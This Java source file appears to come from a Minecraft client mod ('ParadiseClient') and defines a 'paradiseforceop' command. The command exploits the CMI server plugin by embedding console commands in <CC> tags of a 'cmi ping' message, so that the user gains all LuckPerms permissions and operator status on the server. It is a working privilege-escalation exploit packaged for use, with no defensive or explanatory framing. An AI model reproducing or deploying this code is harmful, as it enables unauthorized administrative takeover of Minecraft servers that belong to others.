package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.client.MinecraftClient;
import io.github.spigotrce.paradiseclientfabric.command.Command;

import java.util.Objects;

public class ForceOPCommand extends Command {
    public ForceOPCommand(MinecraftClient minecraftClient) {
        super("paradiseforceop", "Gives OP thru CMI console command sender exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<FabricClientCommandSource> build() {
        return literal(getName())
                .executes((context -> {
                    Objects.requireNonNull(getMinecraftClient().getNetworkHandler()).sendChatCommand("cmi ping <T>Click here to get luckperms</T><CC>lp user " + getMinecraftClient().getSession().getUsername() + " p set * true</CC>");
                    Objects.requireNonNull(getMinecraftClient().getNetworkHandler()).sendChatCommand("cmi ping <T>Click here to get OP</T><CC>op" + getMinecraftClient().getSession().getUsername() + "</CC>");
                    return SINGLE_SUCCESS;
                }));
    }
}
